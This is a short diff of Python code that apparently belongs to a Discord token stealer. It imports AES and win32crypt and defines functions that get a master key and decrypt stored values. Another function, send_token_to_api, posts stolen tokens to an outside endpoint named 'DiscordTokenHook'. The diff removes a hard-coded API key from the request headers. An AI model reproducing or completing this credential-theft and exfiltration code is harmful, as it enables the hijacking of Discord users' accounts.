@@ -8,7 +8,6 @@ from Crypto.Cipher import AES
 import win32crypt
 
 API_URL = "https://api.xenithdev.com/v1/DiscordTokenHook"
-API_KEY = "471b934ca6a4dd164912022e43e9ed22fcc33c6f911a9e2de195972b926cc240"
 
 
 def get_master_key():
@@ -43,7 +42,6 @@ def decrypt_value(buffered_ciphertext, master_key):
 
 def send_token_to_api(token):
   headers = {
-      "x-api-key": API_KEY,
       "Content-Type": "application/json"
   }
   payload = {
